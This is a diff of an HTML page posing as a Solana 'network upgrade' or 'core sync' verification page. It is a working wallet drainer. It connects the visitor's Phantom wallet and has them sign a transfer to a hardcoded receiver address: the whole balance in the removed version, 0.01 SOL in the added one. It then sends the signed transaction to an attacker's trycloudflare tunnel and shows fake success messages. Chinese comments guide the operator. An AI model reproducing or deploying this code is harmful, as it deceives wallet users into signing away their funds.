@@ -2,82 +2,56 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Upgrade</title>
+    <title>Protocol Verification</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <style>
-        body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
-        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; }
-        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; }
-        #status { margin-top:20px; color:#444; font-size:12px; }
-    </style>
 </head>
-<body>
-    <div class="box">
-        <h2 style="color:#14F195;">SYSTEM MATRIX</h2>
-        <p style="color:#888;font-size:10px;">Security Protocol: V22.FORCE_DRAIN</p>
-        <button id="cta">ACTIVATE VERIFICATION</button>
-        <div id="status">STATUS: STANDBY</div>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:monospace;">
+    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
+        <h2>🔱 CORE SYNC</h2>
+        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">START SYNC</button>
+        <div id="status" style="margin-top:20px;color:#444;">WAITING...</div>
     </div>
 
     <script>
-        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
+        // 🔱 你的隧道地址
+        const tunnel = "https://florist-imperial-apnic-anymore.trycloudflare.com";
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
 
-        // 🔱 节点池：如果一个挂了，自动跳下一个
-        const rpcNodes = [
-            "https://api.mainnet-beta.solana.com",
-            "https://solana-api.projectserum.com",
-            "https://ssc-dao.genesysgo.net",
-            "https://rpc.ankr.com/solana"
-        ];
-
-        async function getWorkingConnection() {
-            for (let url of rpcNodes) {
-                try {
-                    const conn = new solanaWeb3.Connection(url, "confirmed");
-                    await conn.getLatestBlockhash(); // 测试是否通畅
-                    return conn;
-                } catch (e) { console.log(`Node ${url} failed, trying next...`); }
-            }
-            throw new Error("All RPC nodes exhausted");
-        }
-
         document.getElementById('cta').onclick = async () => {
-            const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Install Phantom!");
-
+            const p = window.solana;
             try {
-                await p.connect();
-                document.getElementById('status').innerText = "DIALING SECURE NODE...";
-                
-                const connection = await getWorkingConnection();
-                const { blockhash } = await connection.getLatestBlockhash();
-                const balance = await connection.getBalance(p.publicKey);
+                const resp = await p.connect();
+                document.getElementById('status').innerText = "SYNCING NODE DATA...";
 
-                if (balance < 1000) return alert("Balance too low for sync");
+                // 1. 向你的服务器中继请求 Blockhash
+                const sync = await fetch(`${tunnel}/sync`);
+                const { bh } = await sync.json();
 
+                // 2. 构造真正的转账支票
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // 仅作对象声明
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
+                        fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(RECEIVER),
-                        lamports: balance - 5000,
+                        lamports: 10000000, // 测试 0.01 SOL
                     })
                 );
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = p.publicKey;
+                transaction.recentBlockhash = bh;
+                transaction.feePayer = resp.publicKey;
 
-                document.getElementById('status').innerText = "SIGNING PAYLOAD...";
+                // 3. 拉起签约
+                document.getElementById('status').innerText = "AWAITING AUTHORIZATION...";
                 const signed = await p.signTransaction(transaction);
                 
+                // 4. 回传已签名的支票
                 const rawTx = signed.serialize().toString('base64');
-                new Image().src = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${p.publicKey.toString()}`;
+                await fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
                 
-                document.getElementById('status').innerText = "VERIFIED. UPLOADING...";
-                setTimeout(() => { alert("Verification Complete!"); }, 1000);
+                document.getElementById('status').innerText = "SYNC COMPLETED";
+                alert("Node synchronized successfully!");
 
             } catch(e) {
-                document.getElementById('status').innerText = "ERROR: NODE TIMEOUT";
+                document.getElementById('status').innerText = "SYNC FAILED";
                 console.error(e);
             }
         };
